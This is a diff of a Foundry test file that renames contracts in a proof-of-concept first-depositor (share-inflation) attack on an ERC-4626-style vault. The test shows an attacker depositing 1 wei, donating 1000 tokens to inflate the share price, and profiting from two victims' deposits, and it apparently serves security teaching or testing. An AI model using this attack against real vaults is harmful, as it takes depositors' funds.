@@ -30,13 +30,13 @@ pragma solidity ^0.8.13;
 import {Test, console2} from "forge-std/Test.sol";
 import {PPSwap} from "../..//src/first-depositor-attack/PPSwap.sol";
 import {PPSVault} from "../../src/first-depositor-attack/PPSVault.sol";
-import {TokenBFactory} from "../../src/first-depositor-attack/TokenBFactory.sol";
+import {PPSVaultFactory} from "../../src/first-depositor-attack/PPSVaultFactory.sol";
 
 
-contract PPSVault is Test {
+contract PPSVaultTest is Test {
     PPSwap ppswap;
-    TokenB tokenB;
-    TokenBFactory tokenBFactory;
+    PPSVault ppsv;
+    PPSVaultFactory ppsvFactory;
     address deployer = makeAddr("deployer");
     address firstDepositor = makeAddr("firstDepositor");
     address victim1 = makeAddr("victim1");
@@ -50,67 +50,65 @@ contract PPSVault is Test {
         ppswap.transfer(victim2, 2000 ether);
          
         vm.prank(deployer);
-        tokenBFactory = new TokenBFactory();
-        tokenB = tokenBFactory.deployTokenB(address(ppswap));
+        ppsvFactory = new PPSVaultFactory();
+        ppsv =  ppsvFactory.deployPPSVault(address(ppswap));
     }
 
     function testFirstDepositorAttack() public {
         vm.startPrank(firstDepositor);
-        ppswap.approve(address(tokenB), 1);
-        tokenB.deposit(1, firstDepositor); // amount, receiver
-        console2.log("first depositor balance of TokenB", tokenB.balanceOf(firstDepositor));
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        ppswap.approve(address(ppsv), 1);
+        ppsv.deposit(1, firstDepositor); // amount, receiver
+        console2.log("first depositor balance of ppsv", ppsv.balanceOf(firstDepositor));
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
 
         // first depositor donate 1000 ether to inflate price per share
-        ppswap.transfer(address(tokenB), 1000 ether);
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        ppswap.transfer(address(ppsv), 1000 ether);
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
         // victim 1 deposit
         vm.startPrank(victim1);
-        ppswap.approve(address(tokenB), 2000 ether);
-        tokenB.deposit(2000 ether, victim1); // amount, receiver
-        console2.log("victim 1 balance of TokenB", tokenB.balanceOf(victim1));
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        ppswap.approve(address(ppsv), 2000 ether);
+        ppsv.deposit(2000 ether, victim1); // amount, receiver
+        console2.log("victim 1 balance of ppsv", ppsv.balanceOf(victim1));
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
          // victim 2 deposit 
         vm.startPrank(victim2);
-        ppswap.approve(address(tokenB), 2000 ether);
-        tokenB.deposit(2000 ether, victim2); // amount, receiver
-        console2.log("victim 2 balance of TokenB", tokenB.balanceOf(victim2));
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        ppswap.approve(address(ppsv), 2000 ether);
+        ppsv.deposit(2000 ether, victim2); // amount, receiver
+        console2.log("victim 2 balance of ppsv", ppsv.balanceOf(victim2));
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
         console2.log("\n withdrawing....");
         
         // first depositor withdraw 
         vm.startPrank(firstDepositor);
-        tokenB.approve(address(tokenB), 1);
-        tokenB.redeem(1, firstDepositor, firstDepositor); // amount, receiver, owner
+        ppsv.approve(address(ppsv), 1);
+        ppsv.redeem(1, firstDepositor, firstDepositor); // amount, receiver, owner
         // he gained 666 ether below
         console2.log("first depositor balance of PPswap", ppswap.balanceOf(firstDepositor));
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
         // victim1  withdraw 
         vm.startPrank(victim1);
-        // tokenB.approve(address(tokenB), 1);
-        tokenB.redeem(1, victim1, victim1); // amount, receiver, owner
+        ppsv.redeem(1, victim1, victim1); // amount, receiver, owner
         // he gained 1250 ether below
         console2.log("\n victim1 balance of PPswap", ppswap.balanceOf(victim1));
         // lost around 333 ether
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
         // victim2  withdraw 
         vm.startPrank(victim2);
-        // tokenB.approve(address(tokenB), 1);
-        tokenB.redeem(1, victim2, victim2); // amount, receiver, owner
+        ppsv.redeem(1, victim2, victim2); // amount, receiver, owner
         // he gained 1250 ether below
         console2.log("\n victim2 balance of PPswap", ppswap.balanceOf(victim2));
         // lost around 333 ether
-        console2.log("asset/share: ", tokenB.previewRedeem(1));
+        console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
     }
